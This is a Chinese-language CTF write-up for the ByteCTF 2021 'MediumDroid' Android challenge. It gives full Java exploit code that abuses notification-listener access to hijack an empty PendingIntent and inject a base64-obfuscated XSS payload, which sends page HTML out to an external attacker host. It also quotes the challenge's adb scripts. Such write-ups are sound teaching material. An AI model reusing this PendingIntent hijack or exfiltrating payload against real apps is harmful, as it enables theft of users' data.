### MediumDroid of ByteCTF 2021 Quals
- 这里就用中文写吧QAQ
- 前面的没啥就不讲了，可以去比赛的页面看，主要就是绕过域名白名单校验+发任意Intent拉起TestActivity+加载任意URL这一套组合拳，和第二题一样
- 问题是这个JavascriptInterface的接口怎么利用
```java=
@JavascriptInterface
    public void Te3t(String title, String content) {
        if (Build.VERSION.SDK_INT >= 26) {
            ((NotificationManager) getSystemService(NotificationManager.class)).createNotificationChannel(new NotificationChannel("CHANNEL_ID", "CHANNEL_NAME", 4));
        }
        NotificationManagerCompat.from(this).notify(100, new NotificationCompat.Builder(this, "CHANNEL_ID").setContentTitle(title).setContentText(content).setSmallIcon(R.mipmap.ic_launcher).setContentIntent(PendingIntent.getBroadcast(this, 0, new Intent(), 0)).setAutoCancel(true).setPriority(1).build());
    }

```
- 其实答案在`server.py`里面，当时以为这东西三道题都一样的没仔细看QAQ
```python=
def adb_grant_notification(pkg):
    adb(["shell", "cmd", "notification", "allow_listener", f'{pkg}/{pkg}.MagicService'])
#...
adb_grant_notification(ATTACKER)
```
- 这不是明摆着的嘛，通知使用权的权限，然后在onNotificationPosted里面收到通知内容，当然也包括那个我们最需要的PendingIntent
```java=
public class MagicService extends NotificationListenerService {
    private static final String TAG = "MagicService";
    private static final String xssExp = "<img src=\"x\" onerror=\"eval(atob('" +
            "bmV3IEltYWdlKCkuc3JjID0gImh0dHA6Ly90b3V0aWFvLmNvbS5ieXRlY3RmLndybHVzLmNvbT9mbGFn" +
            "PSIgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoImh0bWwi" +
            "KVswXS5pbm5lckhUTUwp'))\">";

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return Service.START_STICKY_COMPATIBILITY;
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (!"com.bytectf.mediumdroid".equals(sbn.getPackageName())) {
            return;
        }
        Notification notification = sbn.getNotification();
        if (notification == null) {
            return;
        }
        Bundle extras = notification.extras;
        if (extras != null) {
            String title = extras.getString(Notification.EXTRA_TITLE, "");
            String content = extras.getString(Notification.EXTRA_TEXT, "");
            Log.d(TAG, "Received notification: Title="+title+", content="+content);
            PendingIntent pendingIntent = notification.contentIntent;
            if (pendingIntent != null) {
//                    Hack the empty PendingIntent
                Intent fillInIntent = new Intent();
                fillInIntent.setClassName("com.bytectf.mediumdroid",
                        "com.bytectf.mediumdroid.FlagReceiver");
                fillInIntent.setAction("com.bytectf.SET_FLAG");
                fillInIntent.putExtra("flag", xssExp);

                try {
                    pendingIntent.send(this, 0, fillInIntent);
                    Log.d(TAG, "PendingIntent sent with SET_FLAG");
                    MainActivity.pendingIntentSent = true;
                } catch (PendingIntent.CanceledException e) {
                    e.printStackTrace();
                }
            }

        }
    }
}

```
- 上面代码也有的，下面就是经典的PendingIntent的fillIn攻击了，直接往里面追加组件名，还有flag的XSS内容，当然别忘了Action要匹配哦。

```java=
Intent fillInIntent = new Intent();
fillInIntent.setClassName("com.bytectf.mediumdroid",
       "com.bytectf.mediumdroid.FlagReceiver");
fillInIntent.setAction("com.bytectf.SET_FLAG");
fillInIntent.putExtra("flag", xssExp);
```
- XSS的内容就直接拿上一道题的就行，不再赘述
```java=
private static final String xssExp = "<img src=\"x\" onerror=\"eval(atob('" +
            "bmV3IEltYWdlKCkuc3JjID0gImh0dHA6Ly90b3V0aWFvLmNvbS5ieXRlY3RmLndybHVzLmNvbT9mbGFn" +
            "PSIgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoImh0bWwi" +
            "KVswXS5pbm5lckhUTUwp'))\">";
```
- 后面就和第二题一样了，symlink + file:// 协议访问，详见Exp
- 然后坑爹的地方就来了
```
2021-10-19 21:11:49.217 897-927/? W/BroadcastQueue: Background execution not allowed: receiving Intent { act=com.bytectf.SET_FLAG flg=0x10 (has extras) } to com.bytectf.mediumdroid/.FlagReceiver
```
- 这东西我说实话，有点尴尬的，因为他题目里面注册的是Manifest广播接收器，这个东西在API 27上面是不能用于收自定义广播的，基本上都收不到
- 那么问题来了，那题目的FLAG咋设置的？其实人家是用adb命令还是root用户执行的，root发的广播不会有限制，但是实际上这里我们一个普通应用发这个PendingIntent，对面是收不到的。
```python=
def adb_broadcast(action, receiver, extras=None):
    args = ["shell", "su", "root", "am", "broadcast", "-W", "-a", action, "-n", receiver]
    if extras:
        for key in extras:
            args += ["-e", key, extras[key]]
    adb(args)
```
- 当然了云端环境是AVD，可能是关了什么东西，实际上这个题还是可以打成功的，也有队伍拿分。